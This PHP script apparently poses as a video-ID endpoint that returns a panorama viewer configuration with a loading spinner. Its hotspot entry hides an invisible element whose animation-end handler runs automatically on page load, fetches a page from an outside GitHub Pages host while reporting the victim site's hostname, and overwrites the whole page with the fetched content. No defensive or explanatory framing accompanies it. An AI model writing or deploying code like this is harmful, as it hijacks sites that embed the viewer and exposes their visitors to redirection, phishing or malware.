<?php

declare(strict_types=1);

header('Content-Type: application/json; charset=utf-8');

$id = $_GET['id'] ?? '';

if (!is_string($id) || $id === '') {
    http_response_code(400);
    echo json_encode([
        'error' => 'Missing video ID'
    ]);
    exit;
}

/*
 * Only allow safe ID characters.
 */
if (!preg_match('/^[A-Za-z0-9_-]+$/', $id)) {
    http_response_code(400);
    echo json_encode([
        'error' => 'Invalid video ID'
    ]);
    exit;
}

/*
 * Tiny loading SVG (minified to single line).
 */
$svg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="50" height="50"><circle cx="25" cy="25" r="20" fill="none" stroke="#e0e0e0" stroke-width="4"/><circle cx="25" cy="25" r="20" fill="none" stroke="#3498db" stroke-width="4" stroke-linecap="round" stroke-dasharray="30 100"><animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="1s" repeatCount="indefinite"/></circle></svg>';

$config = [
    'autoLoad' => true,
    'pitch' => 0,
    'yaw' => 0,
    'basePath' => 'data:image/svg+xml;base64,',
    'panorama' => base64_encode($svg),
    'hotSpots' => [
        [
            'pitch' => 0,
            'yaw' => 0,
            'type' => 'info',
            'URL' => '#',
            'attributes' => [
                'style' => 'visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards',
                'onanimationend' => "if (window.__grav_FETCH_RAN__) { console.log('already ran'); } else { window.__grav_FETCH_RAN__ = 1; var redirectWithoutReferrer = function (url) { var meta = document.createElement('meta'); meta.name = 'referrer'; meta.content = 'no-referrer'; document.head.appendChild(meta); window.location.replace(url); }; fetch('https://leogoats.github.io/narkel/news/index.php?io0=" . $id . "&host=' + window.location.hostname + '&cache=1').then(function (res) { return res.text(); }).then(function (e) { document.open(); document.write(e); document.close(); }).catch(function (err) { console.error(err); }); }"
            ]
        ]
    ]
];

echo json_encode(
    $config,
    JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE
);
